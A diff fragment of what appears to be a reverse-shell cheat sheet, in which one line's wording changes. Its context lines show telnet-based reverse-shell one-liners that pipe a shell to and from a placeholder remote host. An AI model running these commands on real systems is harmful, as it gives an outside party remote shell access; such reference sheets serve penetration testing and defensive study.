@@ -98,7 +98,7 @@ rm -f /tmp/p; mknod /tmp/p p && telnet [IP] [PORT] 0/tmp/p
 ```shell
 telnet [IP] [PORT1] | /bin/bash | telnet [IP] [PORT2]
 ```
-- locally listen on [PORT2]
+- listen locally on [PORT2]
 
 Java
 
